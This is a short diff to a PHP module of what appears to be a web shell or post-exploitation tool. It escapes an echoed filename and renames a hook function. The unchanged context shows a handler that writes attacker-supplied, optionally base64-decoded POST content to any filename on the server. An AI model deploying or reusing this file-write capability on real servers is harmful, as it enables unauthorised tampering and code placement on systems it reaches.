@@ -69,7 +69,7 @@ function __PREFIX__handleWriteFile($operation, $features) {
     $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
 
     echo "Received content of length " . strlen($content) . " bytes.";
-    echo "Writing to $filename ...";
+    echo "Writing to " . htmlentities($filename) . "...";
     flush();
 
     file_put_contents($filename, $content);
@@ -84,7 +84,7 @@ function __PREFIX__handleWriteFile($operation, $features) {
  *
  * @return void
  */
-function __PREFIX__file_write_hooks_features(&$features) {
+function __PREFIX__fileWriteHooksFeatures(&$features) {
     global $WRITE_FILE;
 
     $features[] = array(
@@ -100,7 +100,7 @@ function __PREFIX__file_write_hooks_features(&$features) {
 // section.functions.end
 
 // section.hooks
-add_hook("features", "__PREFIX__file_write_hooks_features");
+add_hook("features", "__PREFIX__fileWriteHooksFeatures");
 add_named_hook("GET_page", $WRITE_FILE, "__PREFIX__makeWriteFilePage");
 add_named_hook("POST_operation", $WRITE_FILE, "__PREFIX__handleWriteFile");
 // section.hooks.end
